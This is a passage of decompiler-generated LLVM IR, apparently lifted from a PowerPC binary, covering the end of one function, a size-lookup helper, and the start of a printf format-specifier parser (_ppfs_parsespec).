  %v3_1000d5b0 = load i32, i32* %v2_1000d5b0, align 4
  store i32 %v3_1000d5b0, i32* %r9.global-to-local, align 4
  %v1_1000d5b4 = add i32 %v3_1000d5b0, 4
  store i32 %v1_1000d5b4, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d5b4, i32* %v2_1000d5b0, align 4
  br label %dec_label_pc_1000d5bc

dec_label_pc_1000d5bc:                            ; preds = %dec_label_pc_1000d598, %dec_label_pc_1000d5b0
  %v0_1000d5bc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d5bc = inttoptr i32 %v0_1000d5bc to i32*
  %v2_1000d5bc = load i32, i32* %v1_1000d5bc, align 4
  store i32 %v2_1000d5bc, i32* %r0.global-to-local, align 4
  %v1_1000d5c0 = load i32, i32* @r8, align 4
  %v2_1000d5c0 = inttoptr i32 %v1_1000d5c0 to i32*
  store i32 %v2_1000d5bc, i32* %v2_1000d5c0, align 4
  br label %dec_label_pc_1000d5c4

dec_label_pc_1000d5c4:                            ; preds = %dec_label_pc_1000d56c, %dec_label_pc_1000d550, %dec_label_pc_1000d52c, %dec_label_pc_1000d5bc
  %v0_1000d5c4 = load i32, i32* @r8, align 4
  %v1_1000d5c4 = add i32 %v0_1000d5c4, 8
  store i32 %v1_1000d5c4, i32* @r8, align 4
  %v0_1000d5c8.pre = load i32, i32* @r7, align 4
  %v0_1000d5cc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d5c8

dec_label_pc_1000d5c8:                            ; preds = %dec_label_pc_1000d494, %dec_label_pc_1000d5c4
  %v0_1000d5cc = phi i32 [ %v2_1000d5a8, %dec_label_pc_1000d494 ], [ %v0_1000d5cc.pre, %dec_label_pc_1000d5c4 ]
  %v0_1000d5c8 = phi i32 [ %v0_1000d494, %dec_label_pc_1000d494 ], [ %v0_1000d5c8.pre, %dec_label_pc_1000d5c4 ]
  %v1_1000d5c8 = add i32 %v0_1000d5c8, 1
  store i32 %v1_1000d5c8, i32* @r7, align 4
  %v1_1000d5cc = add i32 %v0_1000d5cc, 28
  %v2_1000d5cc = inttoptr i32 %v1_1000d5cc to i32*
  %v3_1000d5cc = load i32, i32* %v2_1000d5cc, align 4
  store i32 %v3_1000d5cc, i32* %r0.global-to-local, align 4
  %v2_1000d5d0 = icmp slt i32 %v1_1000d5c8, %v3_1000d5cc
  %v3_1000d5d0 = icmp sgt i32 %v1_1000d5c8, %v3_1000d5cc
  store i1 %v3_1000d5d0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000d5d0, label %dec_label_pc_1000d494, label %dec_label_pc_1000d61c

dec_label_pc_1000d5dc:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000d5e0 = icmp ne i32 %v3_1000d3e4, -2147483648
  %v4_1000d5e0 = icmp eq i32 %v3_1000d3e4, -2147483648
  store i1 %v3_1000d5e0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d5e0, label %dec_label_pc_1000d5e8, label %dec_label_pc_1000d5fc

dec_label_pc_1000d5e8:                            ; preds = %dec_label_pc_1000d5dc
  %v1_1000d5e8 = add i32 %v0_1000d3dc, 36
  %v2_1000d5e8 = inttoptr i32 %v1_1000d5e8 to i8*
  %v3_1000d5e8 = load i8, i8* %v2_1000d5e8, align 1
  %v4_1000d5e8 = zext i8 %v3_1000d5e8 to i32
  %v1_1000d5ec = mul nuw nsw i32 %v4_1000d5e8, 8
  %v2_1000d5f0 = add i32 %v1_1000d5ec, %v1_1000d3e0
  store i32 %v2_1000d5f0, i32* %r9.global-to-local, align 4
  %v1_1000d5f4 = add i32 %v2_1000d5f0, -8
  %v2_1000d5f4 = inttoptr i32 %v1_1000d5f4 to i32*
  %v3_1000d5f4 = load i32, i32* %v2_1000d5f4, align 4
  store i32 %v3_1000d5f4, i32* %r0.global-to-local, align 4
  store i32 %v3_1000d5f4, i32* %v2_1000d3e4, align 4
  %v0_1000d5fc.pre = load i32, i32* @r3, align 4
  %v1_1000d600.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d5fc

dec_label_pc_1000d5fc:                            ; preds = %dec_label_pc_1000d5dc, %dec_label_pc_1000d5e8
  %v1_1000d600 = phi i32 [ -2147483648, %dec_label_pc_1000d5dc ], [ %v1_1000d600.pre, %dec_label_pc_1000d5e8 ]
  %v1_1000d618 = phi i32 [ %v0_1000d3dc, %dec_label_pc_1000d5dc ], [ %v0_1000d5fc.pre, %dec_label_pc_1000d5e8 ]
  %v1_1000d5fc = add i32 %v1_1000d618, 4
  %v2_1000d5fc = inttoptr i32 %v1_1000d5fc to i32*
  %v3_1000d5fc = load i32, i32* %v2_1000d5fc, align 4
  store i32 %v3_1000d5fc, i32* %r0.global-to-local, align 4
  %v3_1000d600 = icmp sgt i32 %v3_1000d5fc, %v1_1000d600
  %v4_1000d600 = icmp eq i32 %v3_1000d5fc, %v1_1000d600
  store i1 %v3_1000d600, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d600, label %dec_label_pc_1000d608, label %dec_label_pc_1000d61c

dec_label_pc_1000d608:                            ; preds = %dec_label_pc_1000d5fc
  %v1_1000d608 = add i32 %v1_1000d618, 37
  %v2_1000d608 = inttoptr i32 %v1_1000d608 to i8*
  %v3_1000d608 = load i8, i8* %v2_1000d608, align 1
  %v4_1000d608 = zext i8 %v3_1000d608 to i32
  %v1_1000d60c = mul nuw nsw i32 %v4_1000d608, 8
  %v1_1000d610 = load i32, i32* @r8, align 4
  %v2_1000d610 = add i32 %v1_1000d60c, %v1_1000d610
  store i32 %v2_1000d610, i32* %r9.global-to-local, align 4
  %v1_1000d614 = add i32 %v2_1000d610, -8
  %v2_1000d614 = inttoptr i32 %v1_1000d614 to i32*
  %v3_1000d614 = load i32, i32* %v2_1000d614, align 4
  store i32 %v3_1000d614, i32* %r0.global-to-local, align 4
  store i32 %v3_1000d614, i32* %v2_1000d5fc, align 4
  %v0_1000d61c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d61c

dec_label_pc_1000d61c:                            ; preds = %dec_label_pc_1000d5c8, %dec_label_pc_1000d5cc.preheader, %dec_label_pc_1000d5fc, %dec_label_pc_1000d608
  %v0_1000d61c = phi i32 [ %v1_1000d618, %dec_label_pc_1000d5fc ], [ %v0_1000d61c.pre, %dec_label_pc_1000d608 ], [ %v0_1000d5cc5, %dec_label_pc_1000d5cc.preheader ], [ %v0_1000d5cc, %dec_label_pc_1000d5c8 ]
  %v1_1000d61c = add i32 %v0_1000d61c, 8
  %v2_1000d61c = inttoptr i32 %v1_1000d61c to i32*
  %v3_1000d61c = load i32, i32* %v2_1000d61c, align 4
  store i32 %v3_1000d61c, i32* %r11.global-to-local, align 4
  %v2_1000d620 = icmp sgt i32 %v3_1000d61c, 0
  store i1 %v2_1000d620, i1* %cr7_gt.global-to-local, align 1
  %v0_1000d624 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000d61c, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_1000d624)
  %v0_1000d628 = load i32, i32* @r3, align 4
  %v1_1000d628 = add i32 %v0_1000d628, 16
  %v2_1000d628 = inttoptr i32 %v1_1000d628 to i32*
  %v3_1000d628 = load i32, i32* %v2_1000d628, align 4
  store i32 %v3_1000d628, i32* %r0.global-to-local, align 4
  %v0_1000d62c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d62c = sub i32 0, %v0_1000d62c
  store i32 %v1_1000d62c, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1000d634 = add i32 %v0_1000d628, 8
  %v3_1000d634 = inttoptr i32 %v2_1000d634 to i32*
  store i32 %v1_1000d62c, i32* %v3_1000d634, align 4
  %v0_1000d638 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d638 = or i32 %v0_1000d638, 8
  store i32 %v1_1000d638, i32* %r0.global-to-local, align 4
  %v0_1000d63c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d63c = load i32, i32* @r3, align 4
  %v2_1000d63c = add i32 %v1_1000d63c, 20
  %v3_1000d63c = inttoptr i32 %v2_1000d63c to i32*
  store i32 %v0_1000d63c, i32* %v3_1000d63c, align 4
  %v1_1000d640 = call i32 @__asm_rlwinm(i32 %v1_1000d638, i32 0, i32 0, i32 30)
  store i32 %v1_1000d640, i32* %r0.global-to-local, align 4
  %v1_1000d644 = load i32, i32* @r3, align 4
  %v2_1000d644 = add i32 %v1_1000d644, 16
  %v3_1000d644 = inttoptr i32 %v2_1000d644 to i32*
  store i32 %v1_1000d640, i32* %v3_1000d644, align 4
  %v0_1000d648 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d648

; uselistorder directives
  uselistorder i32 %v3_1000d5fc, { 1, 0, 2 }
  uselistorder i32 %v1_1000d600, { 1, 0 }
  uselistorder i32 %v3_1000d5cc, { 1, 0, 2 }
  uselistorder i32 %v1_1000d5c8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000d5cc, { 0, 2, 1 }
  uselistorder i32 %v4_1000d544, { 1, 0, 2 }
  uselistorder i32 %v1_1000d504, { 1, 0 }
  uselistorder i32 %v1_1000d4fc, { 2, 0, 1 }
  uselistorder i32 %v1_1000d4a8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000d49c, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1000d494, { 1, 0 }
  uselistorder i32 %v2_1000d5a8, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1000d5cc5, { 1, 0, 2 }
  uselistorder i32 %v3_1000d43c, { 1, 0, 2 }
  uselistorder i32 %v2_1000d46c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1000d3e4, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1000d3dc, { 1, 0, 2 }
  uselistorder i32 %v0_1000d3dc, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 17, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 29, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_gt.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 0, 19, 8, 9, 10, 11, 18, 13, 14, 15, 16, 17 }
  uselistorder i32 37, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 88, { 1, 0 }
  uselistorder label %dec_label_pc_1000d61c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d5fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5c4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000d5bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d58c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000d540, { 1, 0 }
  uselistorder label %dec_label_pc_1000d52c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d494, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5cc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000d480, { 1, 0 }
  uselistorder label %dec_label_pc_1000d43c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d430, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000d658

dec_label_pc_1000d658:                            ; preds = %dec_label_pc_1000d658, %entry
  %v0_1000d658 = phi i32 [ ptrtoint (i32* @global_var_100194e0.722 to i32), %entry ], [ %v1_1000d658, %dec_label_pc_1000d658 ]
  %v1_1000d658 = add i32 %v0_1000d658, -2
  %v2_1000d658 = inttoptr i32 %v1_1000d658 to i16*
  %v3_1000d658 = load i16, i16* %v2_1000d658, align 2
  %v4_1000d658 = sext i16 %v3_1000d658 to i32
  %v4_1000d65c = icmp eq i32 %v4_1000d658, %arg1
  %v3_1000d660.not = icmp ule i32 %v1_1000d658, ptrtoint (i32* @global_var_100194c8.723 to i32)
  %brmerge = or i1 %v4_1000d65c, %v3_1000d660.not
  br i1 %brmerge, label %dec_label_pc_1000d66c, label %dec_label_pc_1000d658

dec_label_pc_1000d66c:                            ; preds = %dec_label_pc_1000d658
  %v2_1000d674 = sub i32 %v1_1000d658, ptrtoint (i32* @global_var_100194c8.723 to i32)
  %v1_1000d67c = udiv i32 %v2_1000d674, 2
  %v2_1000d67c = and i32 %v2_1000d674, -2147483648
  %v3_1000d67c = or i32 %v1_1000d67c, %v2_1000d67c
  %v2_1000d684 = add i32 %v3_1000d67c, ptrtoint (i32* @global_var_100194e0.722 to i32)
  %v3_1000d684 = inttoptr i32 %v2_1000d684 to i8*
  %v4_1000d684 = load i8, i8* %v3_1000d684, align 1
  %v5_1000d684 = zext i8 %v4_1000d684 to i32
  ret i32 %v5_1000d684

; uselistorder directives
  uselistorder i32 %v2_1000d674, { 1, 0 }
  uselistorder i32 %v1_1000d658, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_100194c8.723 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100194e0.722 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1000d68c = load i32, i32* @lr, align 4
  store i32 %v0_1000d68c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000d6a4 = add i32 %tmp, 16
  %v2_1000d6a4 = inttoptr i32 %v1_1000d6a4 to i32*
  %v3_1000d6a4 = load i32, i32* %v2_1000d6a4, align 4
  %v1_1000d6ac = and i32 %v3_1000d6a4, 128
  store i32 %v1_1000d6ac, i32* %r6.global-to-local, align 4
  %v3_1000d6ac = icmp eq i32 %v1_1000d6ac, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1000d6c0 = add i32 %tmp, 24
  %v2_1000d6c0 = inttoptr i32 %v1_1000d6c0 to i32*
  %v3_1000d6c0 = load i32, i32* %v2_1000d6c0, align 4
  store i32 %v3_1000d6c0, i32* @r26, align 4
  br i1 %v3_1000d6ac, label %dec_label_pc_1000d6c8, label %dec_label_pc_1000d6e0

dec_label_pc_1000d6c8:                            ; preds = %entry
  %v2_1000d6c8 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1000d734

dec_label_pc_1000d6d8:                            ; preds = %dec_label_pc_1000d908
  %v1_1000d6d8 = add i32 %v0_1000d8d8, 1
  store i32 %v1_1000d6d8, i32* @r30, align 4
  br label %dec_label_pc_1000d920

dec_label_pc_1000d6e0:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1000d6e4 = load i32, i32* %arg1, align 4
  store i32 %v2_1000d6e4, i32* @r8, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000d6f0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000d6f0, i32* @r7, align 4
  br label %dec_label_pc_1000d6f4

dec_label_pc_1000d6f4:                            ; preds = %dec_label_pc_1000d724.dec_label_pc_1000d6f4_crit_edge, %dec_label_pc_1000d6e0
  %v0_1000d6fc = phi i32 [ %v0_1000d6fc.pre, %dec_label_pc_1000d724.dec_label_pc_1000d6f4_crit_edge ], [ %v2_1000d6e4, %dec_label_pc_1000d6e0 ]
  %v0_1000d6f8 = phi i32 [ %v0_1000d6f8.pre, %dec_label_pc_1000d724.dec_label_pc_1000d6f4_crit_edge ], [ %v2_1000d6f0, %dec_label_pc_1000d6e0 ]
  %v0_1000d700 = phi i32 [ %v0_1000d6f4.pre, %dec_label_pc_1000d724.dec_label_pc_1000d6f4_crit_edge ], [ 0, %dec_label_pc_1000d6e0 ]
  %v1_1000d6f4 = mul i32 %v0_1000d700, 4
  %v2_1000d6f8 = add i32 %v0_1000d700, %v0_1000d6f8
  store i32 %v2_1000d6f8, i32* %r9.global-to-local, align 4
  %v2_1000d6fc = add i32 %v1_1000d6f4, %v0_1000d6fc
  store i32 %v2_1000d6fc, i32* %r11.global-to-local, align 4
  %v1_1000d700 = add i32 %v0_1000d700, 1
  store i32 %v1_1000d700, i32* %r10.global-to-local, align 4
  %v1_1000d704 = add i32 %v2_1000d6fc, -4
  %v2_1000d704 = inttoptr i32 %v1_1000d704 to i32*
  %v3_1000d704 = load i32, i32* %v2_1000d704, align 4
  store i32 %v3_1000d704, i32* %r0.global-to-local, align 4
  %v1_1000d708 = trunc i32 %v3_1000d704 to i8
  %v3_1000d708 = add i32 %v2_1000d6f8, 24
  %v4_1000d708 = inttoptr i32 %v3_1000d708 to i8*
  store i8 %v1_1000d708, i8* %v4_1000d708, align 1
  %v0_1000d70c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d70c = urem i32 %v0_1000d70c, 256
  store i32 %v1_1000d70c, i32* %r0.global-to-local, align 4
  %v0_1000d714 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d714 = add i32 %v0_1000d714, -4
  %v2_1000d714 = inttoptr i32 %v1_1000d714 to i32*
  %v3_1000d714 = load i32, i32* %v2_1000d714, align 4
  store i32 %v3_1000d714, i32* %r9.global-to-local, align 4
  %v4_1000d718 = icmp eq i32 %v1_1000d70c, %v3_1000d714
  br i1 %v4_1000d718, label %dec_label_pc_1000d720, label %dec_label_pc_1000db90

dec_label_pc_1000d720:                            ; preds = %dec_label_pc_1000d6f4
  %v3_1000d710 = icmp eq i32 %v1_1000d70c, 0
  br i1 %v3_1000d710, label %dec_label_pc_1000d728, label %dec_label_pc_1000d724

dec_label_pc_1000d724:                            ; preds = %dec_label_pc_1000d720
  %v0_1000d724 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d724 = add i32 %v0_1000d724, -1
  store i32 %v1_1000d724, i32* %ctr.global-to-local, align 4
  %v2_1000d724 = icmp eq i32 %v1_1000d724, 0
  br i1 %v2_1000d724, label %dec_label_pc_1000d728, label %dec_label_pc_1000d724.dec_label_pc_1000d6f4_crit_edge

dec_label_pc_1000d724.dec_label_pc_1000d6f4_crit_edge: ; preds = %dec_label_pc_1000d724
  %v0_1000d6f4.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_1000d6f8.pre = load i32, i32* @r7, align 4
  %v0_1000d6fc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000d6f4

dec_label_pc_1000d728:                            ; preds = %dec_label_pc_1000d724, %dec_label_pc_1000d720
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000d72c = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1000d734

dec_label_pc_1000d734:                            ; preds = %dec_label_pc_1000d6c8, %dec_label_pc_1000d728
  %v2_1000d744.pre-phi = phi i32 [ %.pre, %dec_label_pc_1000d6c8 ], [ %v2_1000d6f0, %dec_label_pc_1000d728 ]
  %storemerge3 = phi i32 [ %v2_1000d6c8, %dec_label_pc_1000d6c8 ], [ %v2_1000d72c, %dec_label_pc_1000d728 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 268566528, i32* @r27, align 4
  store i32 %v2_1000d744.pre-phi, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d754

dec_label_pc_1000d750:                            ; preds = %dec_label_pc_1000d860, %dec_label_pc_1000d8e4
  %v0_1000d750 = phi i32 [ %v1_1000d8e4, %dec_label_pc_1000d8e4 ], [ %v0_1000d848, %dec_label_pc_1000d860 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1000d8e4 ], [ %stack_var_-84.2, %dec_label_pc_1000d860 ]
  store i32 %v0_1000d750, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d754

dec_label_pc_1000d754:                            ; preds = %dec_label_pc_1000d734, %dec_label_pc_1000d750
  %v0_1000d768 = phi i32 [ %storemerge3, %dec_label_pc_1000d734 ], [ %v0_1000d750, %dec_label_pc_1000d750 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1000d734 ], [ %stack_var_-84.0, %dec_label_pc_1000d750 ]
  %v1_1000d754 = inttoptr i32 %v0_1000d768 to i8*
  %v2_1000d754 = load i8, i8* %v1_1000d754, align 1
  %v3_1000d754 = zext i8 %v2_1000d754 to i32
  store i32 %v3_1000d754, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d768, i32* @r30, align 4
  %v3_1000d75c = icmp eq i8 %v2_1000d754, 42
  br i1 %v3_1000d75c, label %dec_label_pc_1000d764, label %dec_label_pc_1000d774

dec_label_pc_1000d764:                            ; preds = %dec_label_pc_1000d754
  %v0_1000d764 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d764 = mul i32 %v0_1000d764, -4
  store i32 %v1_1000d764, i32* %r0.global-to-local, align 4
  %v1_1000d768 = add i32 %v0_1000d768, 1
  store i32 %v1_1000d768, i32* @r30, align 4
  %v0_1000d76c = load i32, i32* @r1, align 4
  %v2_1000d76c = add i32 %v0_1000d76c, %v1_1000d764
  store i32 %v2_1000d76c, i32* %r9.global-to-local, align 4
  %v0_1000d770 = load i32, i32* @r29, align 4
  %v2_1000d770 = add i32 %v2_1000d76c, 8
  %v3_1000d770 = inttoptr i32 %v2_1000d770 to i32*
  store i32 %v0_1000d770, i32* %v3_1000d770, align 4
  %v0_1000d78c.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d774

dec_label_pc_1000d774:                            ; preds = %dec_label_pc_1000d754, %dec_label_pc_1000d764
  %v0_1000d78c.pre = phi i32 [ %v0_1000d768, %dec_label_pc_1000d754 ], [ %v0_1000d78c.pre.pre, %dec_label_pc_1000d764 ]
  %v3_1000d774 = load i32, i32* @global_var_1002b8c0, align 4
  store i32 %v3_1000d774, i32* @r7, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1000d78c

dec_label_pc_1000d780:                            ; preds = %dec_label_pc_1000d78c
  %v2_1000d790 = icmp sgt i32 %v0_1000d7d8, 4094
  br i1 %v2_1000d790, label %dec_label_pc_1000d788, label %dec_label_pc_1000d784

dec_label_pc_1000d784:                            ; preds = %dec_label_pc_1000d780
  %v1_1000d784 = add i32 %v2_1000d7a4, -48
  store i32 %v1_1000d784, i32* @r8, align 4
  br label %dec_label_pc_1000d788

dec_label_pc_1000d788:                            ; preds = %dec_label_pc_1000d780, %dec_label_pc_1000d784
  %v0_1000d79015 = phi i32 [ %v0_1000d7d8, %dec_label_pc_1000d780 ], [ %v1_1000d784, %dec_label_pc_1000d784 ]
  %v1_1000d788 = add i32 %v0_1000d808, 1
  store i32 %v1_1000d788, i32* @r30, align 4
  br label %dec_label_pc_1000d78c

dec_label_pc_1000d78c:                            ; preds = %dec_label_pc_1000d774, %dec_label_pc_1000d788
  %v0_1000d7d8 = phi i32 [ 0, %dec_label_pc_1000d774 ], [ %v0_1000d79015, %dec_label_pc_1000d788 ]
  %v0_1000d808 = phi i32 [ %v0_1000d78c.pre, %dec_label_pc_1000d774 ], [ %v1_1000d788, %dec_label_pc_1000d788 ]
  %v1_1000d78c = inttoptr i32 %v0_1000d808 to i8*
  %v2_1000d78c = load i8, i8* %v1_1000d78c, align 1
  %v3_1000d78c = zext i8 %v2_1000d78c to i32
  store i32 %v3_1000d78c, i32* %r11.global-to-local, align 4
  %v1_1000d794 = mul nuw nsw i32 %v3_1000d78c, 2
  store i32 %v1_1000d794, i32* %r9.global-to-local, align 4
  %v2_1000d798 = add i32 %v1_1000d794, %v3_1000d774
  %v3_1000d798 = inttoptr i32 %v2_1000d798 to i16*
  %v4_1000d798 = load i16, i16* %v3_1000d798, align 2
  %v5_1000d798 = zext i16 %v4_1000d798 to i32
  store i32 %v5_1000d798, i32* %r0.global-to-local, align 4
  %v1_1000d79c = mul i32 %v0_1000d7d8, 10
  %v1_1000d7a0 = and i32 %v5_1000d798, 8
  store i32 %v1_1000d7a0, i32* @r25, align 4
  %v3_1000d7a0 = icmp eq i32 %v1_1000d7a0, 0
  %v2_1000d7a4 = add i32 %v3_1000d78c, %v1_1000d79c
  store i32 %v2_1000d7a4, i32* %r9.global-to-local, align 4
  br i1 %v3_1000d7a0, label %dec_label_pc_1000d7ac, label %dec_label_pc_1000d780

dec_label_pc_1000d7ac:                            ; preds = %dec_label_pc_1000d78c
  %v0_1000d7ac = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d7ac = add i32 %v0_1000d7ac, -1
  %v2_1000d7ac = inttoptr i32 %v1_1000d7ac to i8*
  %v3_1000d7ac = load i8, i8* %v2_1000d7ac, align 1
  %v4_1000d7ac = zext i8 %v3_1000d7ac to i32
  store i32 %v4_1000d7ac, i32* %r0.global-to-local, align 4
  %v3_1000d7b0 = icmp eq i8 %v3_1000d7ac, 37
  br i1 %v3_1000d7b0, label %dec_label_pc_1000d7b8, label %dec_label_pc_1000d880

dec_label_pc_1000d7b8:                            ; preds = %dec_label_pc_1000d7ac
  %v3_1000d7b8 = icmp eq i8 %v2_1000d78c, 36
  br i1 %v3_1000d7b8, label %dec_label_pc_1000d7c0, label %dec_label_pc_1000d7f4

dec_label_pc_1000d7c0:                            ; preds = %dec_label_pc_1000d7b8
  %tmp58 = icmp slt i32 %v0_1000d7d8, 1
  br i1 %tmp58, label %dec_label_pc_1000d7f4, label %dec_label_pc_1000d7c8

dec_label_pc_1000d7c8:                            ; preds = %dec_label_pc_1000d7c0
  %v0_1000d7c8 = load i32, i32* @r26, align 4
  %v3_1000d7c8 = icmp eq i32 %v0_1000d7c8, 0
  %v1_1000d7cc = add i32 %v0_1000d808, 1
  store i32 %v1_1000d7cc, i32* %r10.global-to-local, align 4
  br i1 %v3_1000d7c8, label %dec_label_pc_1000db90, label %dec_label_pc_1000d7d4

dec_label_pc_1000d7d4:                            ; preds = %dec_label_pc_1000d7c8
  %v3_1000d7d4 = icmp sgt i32 %v0_1000d7d8, %v0_1000d7c8
  br i1 %v3_1000d7d4, label %dec_label_pc_1000d7e0, label %dec_label_pc_1000d7ec

dec_label_pc_1000d7e0:                            ; preds = %dec_label_pc_1000d7d4
  store i32 %v0_1000d7d8, i32* @r26, align 4
  br label %dec_label_pc_1000d7ec

dec_label_pc_1000d7e8:                            ; preds = %dec_label_pc_1000d810, %dec_label_pc_1000d808
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000d7ec

dec_label_pc_1000d7ec:                            ; preds = %dec_label_pc_1000d7d4, %dec_label_pc_1000d7e0, %dec_label_pc_1000d7e8
  %v0_1000d7ec = phi i32 [ %v0_1000d7ac, %dec_label_pc_1000d7e8 ], [ %v1_1000d7cc, %dec_label_pc_1000d7e0 ], [ %v1_1000d7cc, %dec_label_pc_1000d7d4 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1000d7e8 ], [ %v0_1000d7d8, %dec_label_pc_1000d7e0 ], [ %v0_1000d7d8, %dec_label_pc_1000d7d4 ]
  br label %dec_label_pc_1000d828

dec_label_pc_1000d7f4:                            ; preds = %dec_label_pc_1000d7b8, %dec_label_pc_1000d7c0
  %v0_1000d7f4 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1000d7f4, 1
  br i1 %tmp59, label %dec_label_pc_1000d808, label %dec_label_pc_1000d7fc

dec_label_pc_1000d7fc:                            ; preds = %dec_label_pc_1000d7f4
  %v3_1000d7fc = icmp eq i8 %v2_1000d78c, 109
  br i1 %v3_1000d7fc, label %dec_label_pc_1000d880, label %dec_label_pc_1000db90

dec_label_pc_1000d808:                            ; preds = %dec_label_pc_1000d7f4
  %v3_1000d808 = icmp ugt i32 %v0_1000d808, %v0_1000d7ac
  br i1 %v3_1000d808, label %dec_label_pc_1000d810, label %dec_label_pc_1000d7e8

dec_label_pc_1000d810:                            ; preds = %dec_label_pc_1000d808
  %v1_1000d810 = inttoptr i32 %v0_1000d7ac to i8*
  %v2_1000d810 = load i8, i8* %v1_1000d810, align 1
  %v3_1000d810 = zext i8 %v2_1000d810 to i32
  store i32 %v3_1000d810, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d7ac, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000d81c = icmp eq i8 %v2_1000d810, 48
